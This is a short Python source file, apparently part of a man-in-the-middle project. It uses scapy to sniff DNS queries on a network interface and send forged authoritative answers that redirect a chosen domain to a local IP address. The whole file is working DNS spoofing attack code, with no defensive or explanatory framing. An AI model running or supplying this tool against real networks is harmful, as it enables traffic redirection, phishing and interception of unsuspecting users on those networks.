import sys
from scapy.all import IP, UDP, DNS, DNSRR, sniff, send
import data

#TARGET_DOMAIN = b"httpforever.com."
TARGET_IP = data.ipLocal
INTERFACE = "en0"

def spoof_dns(packet, target_domain):
    if packet.haslayer(DNS) and packet.haslayer(IP) and packet.haslayer(UDP) and packet[DNS].qr == 0:
        qname = packet[DNS].qd.qname
        
        if target_domain in qname:
            print(f"Caught: {qname}")
            
            newPacket = (
                IP(src = packet[IP].dst, dst=packet[IP].src)/
                UDP(sport = packet[UDP].dport, dport = packet[UDP].sport)/
                DNS(
                    id=packet[DNS].id,
                        qr=1,
                        aa=1,
                        qd=packet[DNS].qd,
                        an=DNSRR(
                            rrname=qname,
                            type='A',
                            rclass='IN',
                            ttl=10,
                            rdata=TARGET_IP
                        )
                    )
            )
            
            send(newPacket, iface=INTERFACE, verbose=False)


def dnsSpoofin(target_domain):
    try:
        sniff(iface=INTERFACE, filter="udp port 53", prn=lambda packet: spoof_dns(packet, target_domain), store=0)
    except KeyboardInterrupt:
        sys.exit()